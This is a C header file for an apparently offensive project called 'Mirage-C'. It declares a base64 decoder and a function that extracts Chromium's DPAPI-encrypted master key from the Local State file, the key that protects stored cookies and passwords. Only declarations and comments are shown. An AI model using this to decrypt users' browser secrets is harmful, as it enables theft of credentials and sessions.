/*
 * chrome_key.h — Chrome encryption key extraction for Mirage-C
 *
 * Parses the Local State JSON file to extract the base64-encoded
 * encrypted_key field, then base64-decodes it. The result is the
 * DPAPI-encrypted key used by Chromium to encrypt stored cookies,
 * passwords, and other secrets.
 */

#ifndef MIRAGE_CHROME_KEY_H
#define MIRAGE_CHROME_KEY_H

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/*
 * mirage_base64_decode — Decode a base64 string into output buffer.
 *
 * Input length must be a multiple of 4. Output buffer must be
 * large enough (input_len / 4 * 3 bytes).
 *
 * Returns pointer to output on success, NULL on failure.
 */
uint8_t* mirage_base64_decode(const uint8_t* input, size_t input_len,
                               uint8_t* output, size_t output_size);

/*
 * mirage_extract_encrypted_key — Extract encrypted_key from Local State JSON.
 *
 * Searches for "\"encrypted_key\":\"" in the JSON string, extracts
 * the base64 value, and decodes it.
 *
 * Output buffer should be at least 256 bytes.
 * Returns pointer to decoded key on success, NULL on failure.
 */
uint8_t* mirage_extract_encrypted_key(const uint8_t* json, size_t json_len,
                                       uint8_t* output, size_t output_size);

#ifdef __cplusplus
}
#endif

#endif /* MIRAGE_CHROME_KEY_H */
